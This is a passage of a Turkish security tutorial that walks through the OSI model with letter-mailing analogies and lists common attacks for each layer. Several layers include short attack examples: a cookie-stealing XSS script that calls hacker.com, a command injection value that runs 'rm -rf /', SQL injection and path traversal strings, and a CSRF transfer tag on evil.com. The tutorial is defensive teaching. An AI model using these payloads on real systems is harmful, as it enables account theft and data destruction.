# 🎓 OSI MODELİ: SİBER GÜVENLİK PERSPEKTİFİYLE KAPSAMLI REHBER

**[ZORUNLU YASAL UYARI]**: Bu bilgiler sadece eğitim ve etik güvenlik testi amaçlıdır. İzinsiz sistemlere yapılan saldırıların sorumluluğu kullanıcıya aittir.

---

## 📬 TEMEL ANALOJİ: MEKTUP GÖNDERİM SÜRECİ

Sevgiline aşk mektubu yazıyorsun. İşte bu basit eylem **tam olarak** internet paketinin yolculuğudur!

```
┌─────────────────────────────────────────────────┐
│  SENİN ZİHNİNDE: "Seni seviyorum" ❤️          │ ← Ham veri (Raw Data)
└─────────────────────────────────────────────────┘
                    ↓ 
            (Encapsulation Başlıyor)
                    
┌─────────────────────────────────────────────────┐
│ Layer 7: Mektubu kağıda yaz, imzala           │
│          + Üstüne "Aşk Mektubu" yaz (HTTP)     │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│ Layer 6: Zarfa koy, mühürle (Şifreleme/SSL)   │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│ Layer 5: "5 gün içinde ulaşsın" kuralı ekle    │
│          (Session management)                   │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│ Layer 4: Uzun mektup → 5 parçaya böl          │
│          Her parçaya numara: 1/5, 2/5... (TCP) │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│ Layer 3: Gönderici/Alıcı adresi yaz (IP)      │
│          "Ankara → İstanbul"                    │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│ Layer 2: Posta kutusuna özel etiket (MAC)     │
│          Posta çantasına koy (Ethernet Frame)  │
└─────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────┐
│ Layer 1: Postacı bisiklete binip pedal çevirir│
│          (Elektrik sinyali kabloda akar) ⚡     │
└─────────────────────────────────────────────────┘
                    ↓
            [HEDEF ADRESE ULAŞIR]
```

**KRİTİK NOKTA:** Mektup geri dönerken (Response) aynı katmanlar **TERS SIRADA** açılır!

---

# 🔍 7 KATMAN: SİVİL HAYAT → TEKNİK → HACKER

---

## 🎭 LAYER 7: APPLICATION (Uygulama Katmanı)

### 📱 Sivil Hayattaki Karşılığı

> **"Mektubun kendisi - içerik ve amaç"**

Mektupta ne yazıyor? "Seni seviyorum" mu, "Borç talebi" mi, "İş başvurusu" mu? İşte Layer 7 bu **içeriği** ve **amacı** belirler.

**Gerçek hayat örnekleri:**
- WhatsApp'ta mesaj atıyorsun → Layer 7
- Netflix'te film izliyorsun → Layer 7
- Google'da arama yapıyorsun → Layer 7
- Instagram'a fotoğraf yüklüyorsun → Layer 7

Hepsi farklı **diller** (protokoller) konuşur ama hepsi Layer 7'de!

### 🔧 Teknik Tanımı

**Protokol = Dil ve Kurallar Kümesi**

Tıpkı Türkçe, İngilizce, Fransızca gibi, her protokol farklı bir "dil"dir:

| Protokol | Ne Yapar? | Port | Analoji |
|----------|-----------|------|---------|
| **HTTP** | Web sayfası gösterme dili | 80 | Türkçe konuşma |
| **HTTPS** | Şifreli web dili | 443 | Şifreli Türkçe |
| **SSH** | Güvenli uzaktan bağlantı | 22 | Gizli telefon hattı |
| **FTP** | Dosya taşıma dili | 21 | Taşıma şirketi dili |
| **SMTP** | Email gönderme dili | 25 | Posta servisi dili |
| **DNS** | İsim-IP çevirici | 53 | Telefon rehberi |

**Neden HTTP "Uygulama Katmanında"?**

```
Senaryo: Web tarayıcısı açıyorsun

Tarayıcı düşünüyor:
"Kullanıcı ne istiyor? → Bir web sayfası
 Hangi dilde konuşmalıyım? → HTTP
 Ne söyleyeceğim? → 'GET /index.html HTTP/1.1'
 Cevabı nasıl anlayacağım? → HTTP kurallarına göre parse edeceğim"

→ Tüm bu AMAÇ ve ANLAM katmanı Layer 7'dir!
```

**Port nedir? Neden her protokol farklı port kullanır?**

**Apartman Analojisi:**

```
Bina (IP Adresi): 192.168.1.100
  
  ├─ Daire 22 (SSH)      → "Güvenlik görevlisi kapısı"
  ├─ Daire 25 (SMTP)     → "Posta kutusu"
  ├─ Daire 80 (HTTP)     → "Ana giriş kapısı"
  ├─ Daire 443 (HTTPS)   → "Zırhlı kapı"
  ├─ Daire 3306 (MySQL)  → "Bodrum depo kapısı"
  └─ Daire 8080 (Alt HTTP)→ "Arka kapı"

Aynı binada (IP'de) farklı servisler farklı "kapılar" (portlar) kullanır!
```

**Örnek HTTP İsteği (İçini Görüyoruz):**

```http
GET /index.html HTTP/1.1
Host: google.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
```

Bu **tam olarak** bir mektubun içeriğidir!

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **SQL Injection** (En Meşhur Layer 7 Saldırısı)

**Senaryo:** Login sayfası

**Normal Kullanıcı:**
```
Kullanıcı adı: admin
Şifre: 12345

SQL sorgusu: SELECT * FROM users WHERE username='admin' AND password='12345'
```

**Hacker:**
```
Kullanıcı adı: admin' OR '1'='1
Şifre: [boş]

SQL sorgusu: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''

Veritabanı düşünüyor: "'1'='1' her zaman doğru, giriş yapsın!"
→ Şifre bilmeden giriş! 🚨
```

**Gerçek hayat analojisi:**
```
Kapıcı: "Parolanız?"
Normal kişi: "Mavi gökyüzü"
Hacker: "Parola ne olursa olsun, zaten ben sahibim!"
Kapıcı: "Mantıklı, girin!" 
```

#### 2. **XSS (Cross-Site Scripting)**

**Senaryo:** Yorum sistemi

**Normal Kullanıcı:**
```
Yorum: "Bu ürünü çok beğendim!"
```

**Hacker:**
```
Yorum: <script>
  document.location='http://hacker.com/steal?cookie='+document.cookie
</script>

→ Diğer kullanıcılar sayfayı açınca onların cookie'si çalınır!
```

**Gerçek hayat analojisi:**
```
Bir duvara not yapıştırabiliyorsun.
Normal: "Kahve içmeyi severim"
Hacker: "Bu notu okuyan herkes bana 100TL göndersin" + hipnotik mesaj
→ Herkes okuduğunda etkilenir!
```

#### 3. **Command Injection**

**Senaryo:** Ping test aracı

```
Normal kullanıcı: "8.8.8.8" yazar

Sunucu: ping 8.8.8.8 komutunu çalıştırır ✓

Hacker: "8.8.8.8; rm -rf /" yazar

Sunucu: ping 8.8.8.8; rm -rf / komutunu çalıştırır
         ↑ Ping atar   ↑ Tüm dosyaları siler! 🔥
```

#### 4. **Path Traversal**

```
Normal istek: /images/logo.png

Hacker isteği: /images/../../../etc/passwd

→ Sunucu: "../../../etc/passwd" → 3 klasör geri git → /etc/passwd'ı göster
→ Sistem şifrelerini gördü!
```

**HACKER'IN KAZANCI:**
- ✅ Direkt veriyi çalabilir (SQL Injection)
- ✅ Diğer kullanıcıları etkileyebilir (XSS)
- ✅ Sunucuyu kontrol edebilir (Command Injection)
- ✅ Gizli dosyalara erişebilir (Path Traversal)

**En büyük veri sızıntıları Layer 7'de olur!**

---

## 🎨 LAYER 6: PRESENTATION (Sunum/Gösterim Katmanı)

### 📱 Sivil Hayattaki Karşılığı

> **"Mektubu zarfa koyma, şifreleme ve format dönüştürme"**

Mektubu yazdın ama:
1. Sevgilin Çince biliyor, sen Türkçe yazdın → Çeviri gerekiyor
2. Postacının okumasını istemiyorsun → Şifreleme gerekiyor
3. Mektup çok büyük → Sıkıştırma gerekiyor

**Gerçek hayat örnekleri:**
- Bir resmi JPEG'den PNG'ye çevirme → Layer 6
- Video'yu H.264 ile kodlama → Layer 6
- Dosyayı ZIP'leme → Layer 6
- HTTPS ile şifreleme → Layer 6

### 🔧 Teknik Tanımı

**Görevleri:**

1. **Encoding/Decoding (Kodlama)**
   - ASCII → Unicode
   - JPEG ↔ PNG
   - MP4 ↔ AVI

2. **Encryption/Decryption (Şifreleme)**
   - SSL/TLS (HTTPS'nin kalbi!)
   - AES-256
   - RSA

3. **Compression (Sıkıştırma)**
   - GZIP
   - ZIP
   - Deflate

**HTTPS'nin Sihri Burada Gerçekleşir:**

```
Ham veri:     "Kredi kartım: 1234-5678-9012-3456"
      ↓ (Layer 6 - SSL/TLS Encryption)
Şifreli:      "8x#kF$2mP@9qL!dR3..."
      ↓ (Kabloda gidiyor)
Karşı taraf:  "8x#kF$2mP@9qL!dR3..." alır
      ↓ (Layer 6 - Decryption)
Ham veri:     "Kredi kartım: 1234-5678-9012-3456"
```

**Neden önemli?**
```
HTTP  (Layer 7): "Ne diyeceğim?" → Mesaj içeriği
Layer 6: "Nasıl göndereceğim?" → Şifreli mi, sıkıştırılmış mı?
```

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **SSL Stripping Attack**

**Senaryo:** Kafede WiFi'ye bağlanıyorsun

```
Sen düşünüyorsun: "https://banka.com'a gireceğim (güvenli)"

Ortadaki Hacker:
1. Senin isteğini yakalar
2. Sana "http://banka.com" (şifresiz) gösterir
3. Kendisi "https://banka.com" ile konuşur

Sen → HTTP (şifresiz) → Hacker → HTTPS (şifreli) → Banka

Sonuç: Hacker şifreni açıkta görür!
```

**Gerçek hayat analojisi:**
```
Avukata mektup gönderiyorsun.

Normal: Mühürlü zarf → Avukat açar
SSL Stripping: Postacı zarfı açar, okur, yeni zarfa koyar, avukata verir
→ Avukat mührü görür ama arada okundu!
```

#### 2. **Downgrade Attack**

```
Tarayıcı: "TLS 1.3 kullanalım (en güvenli)"
Hacker (ortada): "Hayır, SSL 2.0 kullanalım (eski, kırık)"

→ Zayıf şifreleme → Kırılabilir!
```

#### 3. **CRIME/BREACH (Compression Attack)**

```
HTTPS şifreli ama sıkıştırma kullanıyor.

Hacker:
1. Farklı payloadlar gönderir
2. Şifreli paket boyutunu ölçer
3. Hangi payload daha küçük paket oluşturdu?
   → O payload gerçek veriyle benziyor!
   
Örnek:
Cookie: secret=abc123

Hacker dener:
- "secret=a" → Paket 150 byte
- "secret=b" → Paket 152 byte
- "secret=abc" → Paket 145 byte (daha küçük! Eşleşme var!)

→ Böyle devam ederek cookie'yi çözer!
```

**HACKER'IN KAZANCI:**
- ✅ Şifreli trafiği görebilir (SSL Stripping)
- ✅ Zayıf şifrelemeye zorlayabilir (Downgrade)
- ✅ Sıkıştırmadan veri çıkarabilir (CRIME)

---

## 🤝 LAYER 5: SESSION (Oturum Katmanı)

### 📱 Sivil Hayattaki Karşılığı

> **"Mektuplaşma sırası ve kuralları"**

Sevgilinle mektuplaşıyorsun:
- 1. Mektup: "Merhaba, nasılsın?"
- 2. Mektup: "İyiyim, sen?"
- 3. Mektup: "Ben de iyiyim, buluşalım mı?"

**Sıra çok önemli!** Eğer 3. mektubu önce okursa anlamsız olur.

Ayrıca:
- Mektuplaşmaya ne zaman başladınız?
- Ne zamana kadar devam edecek?
- Biri cevap vermezse ne olacak?

**İşte bunlar Session yönetimidir!**

**Gerçek hayat örnekleri:**
- Netflix'te filmi durduruyorsun → Kaldığın yer hatırlanır (Session)
- Alışveriş sepetine ürün ekliyorsun → Sepet hatırlanır (Session)
- Oyunda ilerleme kaydediyorsun → Progress saklanır (Session)

### 🔧 Teknik Tanımı

**Görevleri:**

1. **Session Oluşturma (Establishment)**
   ```
   Client: "Konuşmaya başlayalım!"
   Server: "Tamam, işte Session ID'n: abc123"
   ```

2. **Session Yönetimi (Management)**
   ```
   Her istek: "Ben abc123'üm, beni tanı"
   Server: "Tanıdım, devam et"
   ```

3. **Session Sonlandırma (Termination)**
   ```
   30 dakika geçti: "Session timeout!"
   veya
   Logout: "Session sonlandır"
   ```

**Session ID nedir?**

Apartmana giriyorsun, kapıcı sana geçici kart veriyor:

```
Kapıcı: "İşte kartınız: #12345"
Sen her girişte: "#12345 kartını gösteriyorsun"
Kapıcı: "Tanıdım, gir"

30 dakika sonra: "Kartın süresi doldu, tekrar kaydol"
```

**Web'de Session:**

```
1. Login:
   POST /login
   Username: alice
   Password: secret123
   
   → Server: "Başarılı! Session ID: xyz789"
   → Cookie olarak saklanır

2. Her istek:
   GET /profile
   Cookie: session=xyz789
   
   → Server: "xyz789'u tanıdım, Alice'in profili göster"

3. Logout veya Timeout:
   → Session silinir
```

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **Session Hijacking** (En Kritik Saldırı!)

**Senaryo:** Kafede WiFi'desin

```
Alice login oluyor:
→ Session ID: abc123 alıyor
→ Cookie: session=abc123

Hacker (aynı WiFi'de):
1. Wireshark açıyor (paket dinleme aracı)
2. Alice'in trafiğini dinliyor
3. "Cookie: session=abc123" görüyor
4. Kendi tarayıcısına yapıştırıyor

→ Artık Hacker "Alice" olarak sistemde! 🚨
```

**Gerçek hayat analojisi:**
```
Alice otele girdi, resepsiyondan #305 oda kartı aldı.

Hacker: Kartın numarasını gördü (#305)
Hacker: Kendine aynı numarada sahte kart yaptı
Hacker: Alice'in odasına girdi!

→ Resepsiyon fark etmedi çünkü kart numarası doğru!
```

**Koruma:**
```
✓ HTTPS kullan (şifreli, dinlenemez)
✓ HttpOnly Cookie (JavaScript'ten erişilemesin)
✓ Secure flag (sadece HTTPS'te gönderilsin)
✓ IP binding (session belirli IP'ye bağlı)
```

#### 2. **Session Fixation**

**Senaryo:** Hacker seni kandırıyor

```
1. Hacker: Önceden bir session ID oluşturuyor: xyz789

2. Sana link gönderiyor:
   "Bu kupona tıkla: site.com/login?session=xyz789"

3. Sen tıklıyorsun ve login oluyorsun
   → Sistem xyz789 ID'sini kullanıyor (senin seçtiğini sanıyor)

4. Hacker da xyz789 ile giriş yapıyor
   → Senin hesabına erişti!
```

**Gerçek hayat analojisi:**
```
Hacker: Otelde #999 numaralı boş kartı hazırlıyor
Sana: "#999 numaralı odaya gir, çok güzel" diyor
Sen: Resepsiyona gidip "#999 istiyorum" diyorsun
Resepsiyon: #999'u aktif ediyor

→ Hacker da #999 kartıyla odana girebilir!
```

**Koruma:**
```
✓ Her login'de yeni Session ID üret
✓ URL'de Session ID taşıma (sadece Cookie)
```

#### 3. **CSRF (Cross-Site Request Forgery)**

**Senaryo:** Bankaya login oldun, başka siteye gittin

```
1. Sen banka.com'a login oldun (Session aktif)

2. Hacker'ın sitesine giriyorsun: evil.com

3. evil.com'da gizli HTML:
   <img src="banka.com/transfer?to=hacker&amount=1000">

4. Tarayıcın otomatik isteği gönderiyor:
   GET banka.com/transfer?to=hacker&amount=1000
   Cookie: session=abc123 (senin aktif session'ın!)

5. Banka: "Session geçerli, transfer yap!"
   → Paran gitti! 🚨
```

**Gerçek hayat analojisi:**
```
Bankada imzalı çek bıraktın (session).

Hacker: Bankaya sahte fatura gönderiyor
Banka: "İmza var, öde!" diyor
→ İmzan kullanılarak para çekildi!
```

**Koruma:**
```
✓ CSRF Token (her formda benzersiz token)
✓ SameSite Cookie (başka siteden istek engellenir)
✓ POST method kullan (GET değil)
```

**HACKER'IN KAZANCI:**
- ✅ Kimlik doğrulamayı bypass eder (Şifre bilmeden giriş)
- ✅ Başka kullanıcı gibi işlem yapar
- ✅ Oturum çalar ve kullanır

---

## 📦 LAYER 4: TRANSPORT (Taşıma Katmanı)

### 📱 Sivil Hayattaki Karşılığı

> **"Uzun mektubu parçalara bölme ve numaralama"**

100 sayfalık roman yazıyorsun. Tek zarfa sığmaz!

**Çözüm:**
1. 20 zarfa böl
2. Her zarfa numara yaz: **"1/20, 2/20, 3/20... 20/20"**
3. Gönder
4. Alıcı sırayla birleştirir

**Ek sorun:** Ya 7. zarf kaybolursa?

**TCP çözümü:**
```
Alıcı: "1, 2, 3, 4, 5, 6 geldi... 7 yok!"
Gönderici: "7'yi tekrar gönderiyorum"
Alıcı: "7 geldi, devam et!"
```

**UDP çözümü:**
```
Gönderici: Tüm zarfları gönder, kaybolana bakma!
Alıcı: Ne gelirse onla devam et
```

**Gerçek hayat örnekleri:**
- Büyük dosya indirme → Parçalara bölünür (TCP)
- Video streaming → Kayıp pixel önemli değil (UDP)
- Online oyun → Hız önemli, kayıp paket sorun değil (UDP)

### 🔧 Teknik Tanımı

**İki Protokol:**

#### **TCP (Transmission Control Protocol)** - Güvenilir Taşıma

```
Özellikler:
✅ Sıralı teslimat (Paket 3 önce gelirse bekler)
✅ Kayıp paket tespit + tekrar gönderim
✅ 3-way handshake ile bağlantı kurulur
✅ Akış kontrolü (Receiver yavaşsa, sender yavaşlar)
✅ Tıkanıklık kontrolü (Network doluysa, yavaşla)
❌ Yavaş (çok mekanizma var)
❌ Overhead (çok ekstra veri)

Kullanım: HTTP, HTTPS, SSH, FTP, Email
→ Veri bütünlüğü kritikse TCP!
```

#### **UDP (User Datagram Protocol)** - Hızlı Taşıma

```
Özellikler:
✅ Çok hızlı (handshake yok)
✅ Düşük gecikme (latency)
✅ Basit (az ekstra veri)
❌ Sıra garantisi yok
❌ Kayıp paket tespit edilmez
❌ Yeniden gönderim yok

Kullanım: DNS, Video streaming, VoIP, Online games
→ Hız kritikse, biraz kayıp tolere edilebilirse UDP!
```

**Hangisini ne zaman kullanmalı?**

| Durum | Protokol | Neden? |
|-------|----------|--------|
| Dosya indirme | TCP | Her byte önemli |
| Video streaming | UDP | 1-2 frame kayıp fark edilmez |
| Bankacılık | TCP | Veri kaybı kabul edilemez |
| DNS sorgusu | UDP | Hızlı olmalı, kaybolursa tekrar sorarsın |
| SSH bağlantısı | TCP | Komutlar eksiksiz gitmeli |
| VoIP (Zoom call) | UDP | Gecikme olmasın, ses kesilmesi tolere edilebilir |

**TCP 3-Way Handshake** (Tokalaşma):

```
Client                              Server
  │                                    │
  │────────── SYN ──────────────────> │  "Konuşalım mı?"
  │  (Seq=100)                         │
  │                                    │
  │ <────── SYN-ACK ──────────────────│  "Tamam, ben de hazırım!"
  │  (Seq=300, Ack=101)                │
  │                                    │
  │────────── ACK ──────────────────> │  "Harika, başlayalım!"
  │  (Seq=101, Ack=301)                │
  │                                    │
  │═══════ BAĞLANTI KURULDU ═══════════│
  │                                    │
  │─────── DATA ──────────────────────>│  "İşte veriler"
```

**Port Kavramı (Tekrar Detay):**

```
Server = Apartman = IP: 192.168.1.100

Port = Daire Numarası:

  22 numaralı daire (SSH)     → Zırhlı oda, güvenlik
  25 numaralı daire (SMTP)    → Posta kutusu
  53 numaralı daire (DNS)     → Adres rehberi
  80 numaralı daire (HTTP)    → Ana giriş salonu
  443 numaralı daire (HTTPS)  → Şifreli giriş
  3306 numaralı daire (MySQL) → Depo (veritabanı)
  3389 numaralı daire (RDP)   → Uzaktan kontrol odası
  8080 numaralı daire         → Arka kapı (alternatif HTTP)

Aynı anda birden fazla "daire" aktif olabilir!
```

**Örnek Paket Yapısı:**

```
TCP Segment:

┌──────────────────────────────────────┐
│ Source Port: 54321 (client)          │ → Hangi kapıdan çıktı?
├──────────────────────────────────────┤
│ Destination Port: 443 (HTTPS)        │ → Hangi kapıya gidiyor?
├──────────────────────────────────────┤
│ Sequence Number: 1001                │ → Bu paketin sırası
├──────────────────────────────────────┤
│ Acknowledgment Number: 5001          │ → Karşı tarafın hangi paketine cevap?
├──────────────────────────────────────┤
│ Flags: ACK, PSH                      │ → Ne yapılacak?
├──────────────────────────────────────┤
│ Window Size: 65535                   │ → Daha kaç byte gönderebilirsin?
├──────────────────────────────────────┤
│ Checksum: 0x4A3F                     │ → Hata kontrolü
├──────────────────────────────────────┤
│ DATA (Layer 7 payload)               │ → Gerçek veri
└──────────────────────────────────────┘
```

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **SYN Flood** (DDoS Saldırısının Kralı)

**Senaryo:** Sunucuyu çökertme

```
Normal bağlantı:
Client → Server: SYN
Server → Client: SYN-ACK (bekliyor...)
Client → Server: ACK ✓ (bağlantı tamam)

SYN Flood:
Hacker → Server: SYN (sahte IP'den: 1.2.3.4)
Server → 1.2.3.4: SYN-ACK (hiç cevap gelmeyecek!)
Server: 60 saniye bekliyor... (kaynaklar kilitli)

Hacker: 10,000 tane SYN gönderir
Server: 10,000 bağlantı bekliyor (RAM dolu!)
Gerçek kullanıcı: Bağlanamıyor! 🚨
```

**Gerçek hayat analojisi:**
```
Restoran: 50 masası var

Hacker: 50 sahte rezervasyon yapıyor
Restoran: Tüm masaları ayırıyor, müşteri bekliyor
Gerçek müşteriler gelince: "Maalesef dolu!"

→ Restoran gelir kaybediyor!
```

**Koruma:**
```
✓ SYN Cookies
✓ Rate limiting (aynı IP'den çok istek engelle)
✓ Firewall kuralları
```

#### 2. **Port Scanning** (Keşif)

**Nmap ile port tarama:**

```bash
nmap -sS 192.168.1.100

Sonuç:
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql  ← İlginç! Veritabanı dışarıdan erişilebilir!
8080/tcp open  http-proxy
```

**Hacker şunu öğreniyor:**
```
✓ Hangi servisler çalışıyor?
✓ Hangi portlar açık?
✓ Hangi versiyonlar kullanılıyor? (Banner grabbing)
✓ Firewall var mı?

→ Saldırı planı yapıyor!
```

**Gerçek hayat analojisi:**
```
Banka soygunu planlıyorsun (etik test!).

Önce keşif:
- Kaç kapı var? (Port scanning)
- Hangi kapılar açık? (Open ports)
- Güvenlik kamerası var mı? (Firewall detection)
- Kaçış yolu nerede? (Network topology)
```

#### 3. **TCP Session Hijacking**

**Senaryo:** Alice ile Server'ın konuşmasına sızma

```
Alice ↔ Server konuşması:

Alice → Server: SEQ=1000, "Merhaba"
Server → Alice: SEQ=2000, ACK=1001, "Merhaba Alice"
Alice → Server: SEQ=1001, ACK=2001, "Para transfer et"

Hacker (ortada):
1. Alice'in trafiğini dinliyor
2. SEQ ve ACK numaralarını öğreniyor
3. Alice'den önce paket gönderiyor:
   
   Hacker → Server: SEQ=1001, ACK=2001, "Para HACKERa transfer et"
   
4. Server: "Numaralar doğru, Alice bu!" → Kabul ediyor! 🚨
```

**Koruma:**
```
✓ Encryption (HTTPS/TLS - şifreli olursa numaralar işe yaramaz)
✓ Randomize sequence numbers
```

#### 4. **UDP Flood**

```
UDP bağlantı kurmaz, direkt veri yollar.

Hacker:
- Milyonlarca UDP paketi gönderir
- Server her paketi işlemeye çalışır
- CPU ve bandwidth tükenir
→ Servis çöker!
```

**HACKER'IN KAZANCI:**
- ✅ Servisi çökertebilir (DDoS)
- ✅ Açık portları keşfeder (Port scan)
- ✅ Bağlantıyı hijack edebilir
- ✅ Veri akışını manipüle edebilir

---

## 🗺️ LAYER 3: NETWORK (Ağ Katmanı)

### 📱 Sivil Hayattaki Karşılığı

> **"Mektuba gönderici ve alıcı adresi yazma"**

Mektubu zarfa koydun. Şimdi ne lazım? **ADRES!**

```
Gönderici: Ankara, Çankaya, X Sokak No:5
Alıcı: İstanbul, Kadıköy, Y Caddesi No:10

→ Postacı bu adreslere bakarak yolu buluyor!
```

**Gerçek hayat örnekleri:**
- GPS'te konum ayarlama → IP adresi gibi
- Kargo gönderme → Nereden nereye?
- Şehirler arası seyahat → Router'lar arası yol

### 🔧 Teknik Tanımı

**IP Adresi = İnternet'te adresin**

```
IPv4: 192.168.1.100 (32 bit)
      ↓
Binary: 11000000.10101000.00000001.01100100

4 oktet (her biri 0-255 arası)

IPv6: 2001:0db8:85a3::8a2e:0370:7334 (128 bit)
      ↓ Çok daha fazla adres!
```

**IP Paketi Yapısı:**

```
┌────────────────────────────────────────┐
│ Version: 4 (IPv4)                      │
├────────────────────────────────────────┤
│ Header Length: 20 bytes                │
├────────────────────────────────────────┤
│ Type of Service: 0                     │
├────────────────────────────────────────┤
│ Total Length: 1500 bytes               │
├────────────────────────────────────────┤
│ Identification: 12345                  │ → Parçalanmış paketleri birleştirmek için
├────────────────────────────────────────┤
│ Flags & Fragment Offset                │
├────────────────────────────────────────┤
│ TTL: 64                                │ → Time To Live (64 hop sonra öl)
├────────────────────────────────────────┤
│ Protocol: 6 (TCP)                      │ → Üst katman hangisi?
├────────────────────────────────────────┤
│ Source IP: 192.168.1.100               │ → Nereden?
├────────────────────────────────────────┤
│ Destination IP: 8.8.8.8                │ → Nereye?
├────────────────────────────────────────┤
│ DATA (TCP segment)                     │ → Layer 4 verisi
└────────────────────────────────────────┘
```

**Routing (Yönlendirme):**

```
Sen: 192.168.1.100
Hedef: 8.8.8.8 (Google DNS)

Paket yolculuğu:

192.168.1.100 (sen)
      ↓ (Modem)
192.168.1.1 (Gateway/Router)
      ↓ (ISP Router 1)
10.20.30.1
      ↓ (ISP Router 2)
10.20.40.1
      ↓ (Backbone Router)
172.16.0.1
      ↓ (Google Router)
8.8.8.8 (Hedef!)

Her router "En iyi yol hangisi?" diye düşünüyor (Routing algorithm)
```

**Subnet Mask:**

```
IP: 192.168.1.100
Subnet Mask: 255.255.255.0 (/24)

Anlamı:
- İlk 24 bit → Network kısmı (192.168.1)
- Son 8 bit → Host kısmı (100)

Aynı network'teki IP'ler:
192.168.1.1 → 192.168.1.254 (254 host)

Farklı network:
192.168.2.100 → Router'dan geç!
```

**TTL (Time To Live):**

```
Paket oluştuğunda: TTL=64

Her router'dan geçince: TTL-1

64 → 63 → 62 → ... → 1 → 0

TTL=0 olursa: Paket imha edilir!

Neden? Sonsuz döngü önleme:
Router A → Router B → Router A → ...
→ TTL bitince döngü kırılır!
```

### 🎯 Hacker Buradan Nasıl Sızar?

#### 1. **IP Spoofing** (Kimlik Hırsızlığı)

**Senaryo:** Sahte IP ile paket gönderme

```
Normal:
Hacker IP: 10.0.0.50
Hedef Server: 192.168.1.100

Hacker → Server: "Ben 10.0.0.50'yim"
Server: "Tanımıyorum, red!"

IP Spoofing:
Hacker: Paketi düzenliyor
Source IP: 10.0.0.50 → 192.168.1.5 (güvenilir IP)

Hacker → Server: "Ben 192.168.1.5'im"
Server: "Tanıdım, gir!" 🚨
```

**Gerçek hayat analojisi:**
```
Apartmana girmek istiyorsun.

Normal: "Ben Ahmet'im, 10. kattan"
Kapıcı: "10. katta Ahmet yok!"

Spoofing: "Ben Mehmet'im, 5. kattan" (yalan)
Kapıcı: "Tanıdım, geç!"
```

**Kullanım alanları:**
- DDoS saldırılarında kimliğini gizleme
- Firewall bypass (güvenilir IP gibi görünme)
- Man-in-the-Middle için hazırlık

#### 2. **ICMP Flood (Ping of Death)**

```
ICMP = Internet Control Message Protocol
Kullanımı: ping komutu

Normal ping:
ping 8.8.8.8 → Küçük paket (64 byte)

ICMP Flood:
Hacker: 100,000 ping/saniye gönder!
Hedef: İşlemeyebiliyor → Çöküyor!
```

**Ping of Death (Eski zafiyet):**
```
Normal ICMP: 64 byte
Maximum IP paket: 65,535 byte

Hacker: 65,536 byte ICMP gönder!
Hedef sistem: Buffer overflow → Crash! 💥

(Artık yamalandı ama fikir önemli)
```

#### 3. **Smurf Attack**

```
Senaryo: IP broadcast kullanarak amplifikasyon

1. Hacker: Broadcast IP'ye ping gönder
   Destination: 192.168.1.255 (tüm networke gider)
   Source IP: 192.168.1.100 (kurbanın IP'si - spoofed!)

2. Network'teki 254 cihaz: Ping'e cevap veriyor
   → Hepsi 192.168.1.100'e cevap gönderiyor!

3. Kurban: 1 ping gönderdi, 254 cevap aldı!
   → Amplifikasyon: 254x
   → Network tıkanıyor! 🚨
```

**Gerçek hayat analojisi:**
```
Stadyumda bağırıyorsun (broadcast): "Herkes Alice'e selam versin!"
50,000 kişi Alice'i arıyor → Telefonu çöküyor!
```

#### 4. **Traceroute ile Keşif**

```bash
traceroute google.com

Çıktı:
1  192.168.1.1 (gateway)
2  10.20.30.1 (ISP router)
3  10.20.40.1 (ISP router 2)
4  172.16.0.1 (Backbone)
5  8.8.8.8 (Google)
```

**Hacker öğreniyor:**
```
✓ Kaç router aradan geçiyor?
✓ Network topolojisi nasıl?
✓ Hangi ISP kullanılıyor?
✓ Hangi router'lar zayıf olabilir?

→ Saldırı yolu planlanıyor!
```

**HACKER'IN KAZANCI:**
- ✅ Kimliğini gizler (IP Spoofing)
- ✅ Network'ü keşfeder (Traceroute)
- ✅ DDoS amplifikasyonu yapar (Smurf)
- ✅ Servisleri çökertir (ICMP Flood)

---

## 🔗 LAYER 2: DATA LINK (Veri Bağlantı Katmanı)

### 📱 Sivil Hayattaki Karşılığı

> **"Mektubu posta kutusuna atma ve posta çantasına koyma"**

IP adresi yazdın (Layer 3). Şimdi:
1. Mektubu posta kutusuna atıyorsun
2. Postacı posta çantasına koyuyor
3. Komşu postaneye taşıyor

**Her "durak" arasında bu katman devreye girer!**

```
Ev → Mahalle postanesi (Frame 1)
Mahalle → İlçe postanesi (Frame 2)
İlçe → İl postanesi (Frame 3)
...
```

**Gerçek hayat örnekleri:**
- Ethernet kablosu ile router'a bağlanma → Layer 2
- WiFi ile access point'e bağlanma → Layer 2
- Switch'ler arası iletişim → Layer 2

### 🔧 Teknik Tanımı

**MAC Adresi = Fiziksel Adres**

```
MAC: 00:1A:2B:3C:4D:5E (48 bit)
     ↓
6 oktet (her biri hexadecimal)

Her network kartının benzersiz adresi!

Üreticide atanır (değiştirilemez... teorik olarak!)
```

**Ethernet Frame Yapısı:**

```
┌────────────────────────────────────────┐
│ Preamble: 10101010... (senkronizasyon)│
├────────────────────────────────────────┤
│ Destination MAC: 00:1A:2B:3C:4D:5E    │ → Nereye?
├────────────────────────────────────────┤
│ Source MAC: AA:BB:CC:DD:EE:FF          │ → Nereden?
├────────────────────────────────────────┤
│ EtherType: 0x0800 (IPv4)               │ → Üst katman ne?
├────────────────────────────────────────┤
│ DATA (IP Packet)                       │ → Layer 3 verisi
├────────────────────────────────────────┤
│ Frame Check Sequence (CRC)             │ → Hata kontrolü
└────────────────────────────────────────┘
```

**ARP (Address Resolution Protocol):**

**Problem:** IP biliyorsun ama MAC bilmiyorsun!

```
Sen: "8.8.8.8'e gitmek istiyorum"
Router: "Tamam ama önce benim MAC adresimi bilmen lazım"

ARP çalışıyor:

1. Broadcast: "192.168.1.1'in MAC'i nedir?" (herkese sorar)
2. Router: "Benim! MAC: AA:BB:CC:DD:EE:FF"
